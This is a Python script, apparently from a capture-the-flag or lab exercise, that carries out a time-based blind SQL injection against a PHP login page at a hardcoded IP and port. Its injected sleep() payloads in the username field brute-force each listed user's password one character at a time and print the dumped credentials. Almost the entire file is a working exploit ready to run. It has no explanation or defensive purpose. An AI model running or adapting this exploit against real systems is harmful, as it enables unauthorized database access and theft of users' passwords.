import requests
import time
#===================================================TEST dump data
table_db = "users"
columns_pw_db = "password"
columns_db = "username"
username=["test","davik","yone","zed"]
#===================================================


word_text="0123456789abcdefghijklmnopqrstuvwxyz"
list_tables=""
chay = "chay"
name_dumpdb=""
for ii in username:
    time.sleep(0.1)
    #print(i)
    print("Find pass by user ===> "+ii)
    inject = "1' and (select sleep(2) from dual where (select "+columns_pw_db+" from "+table_db+" where "+columns_db+" like '"+ii+"%' limit 0,1) like '%')-- -"

    burp0_url = "http://178.128.121.56:8001/index.php?page=login"
    burp0_cookies = {"PHPSESSID": "4477d705888855e2e3c96293f788e044"}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://178.128.121.56:8001", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://178.128.121.56:8001/index.php?page=login/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    burp0_data = {"username": ""+inject+"", "password": "meo", "login": ''}
    a = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    #print(a.text[:100])
    #print(a.elapsed.total_seconds())
    
    if(a.elapsed.total_seconds() > 2 ):
        chay = "chay"
        name_dumpdb="x"
        while(chay == "chay"):
            
            for i in word_text:
                #print(i)
                time.sleep(0.1)
                name_dumpdb = name_dumpdb[:-1] + i

                print("TRY TEXT ===> "+name_dumpdb)
                inject = "1' and (select sleep(2) from dual where (select "+columns_pw_db+" from "+table_db+" where "+columns_db+" like '%"+ii+"%' limit 0,1) like '"+name_dumpdb+"%')-- -"

                burp0_url = "http://178.128.121.56:8001/index.php?page=login"
                burp0_cookies = {"PHPSESSID": "4477d705888855e2e3c96293f788e044"}
                burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://178.128.121.56:8001", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://178.128.121.56:8001/index.php?page=login/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
                burp0_data = {"username": ""+inject+"", "password": "meo", "login": ''}
                a = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
                #print(a.text[:100])
                #print(a.elapsed.total_seconds())
                if(a.elapsed.total_seconds() > 2 ):
                    
                    name_dumpdb=name_dumpdb+i
                    print("FOUND STRING pass BY VHAE :D ==>  "+name_dumpdb[:-1])
                    break
                    
                
                elif(name_dumpdb[-1:] == word_text[-1:]):
                    print("dung")
                    chay = "dung"

        print("\n")
        print("\n")
        print("===============   FINISH  ==============")
        print("\n")
        print("\n")
        print("NEW name == "+name_dumpdb[:-1])
        list_tables = list_tables+ii+"\n"+name_dumpdb[:-1]+"\n"
        print("\n")
        print("\n")
        print("===============   FINISH  ==============")

print("\n")
print("\n")
print("===============   END LIST DUMP  ==============")
print(list_tables)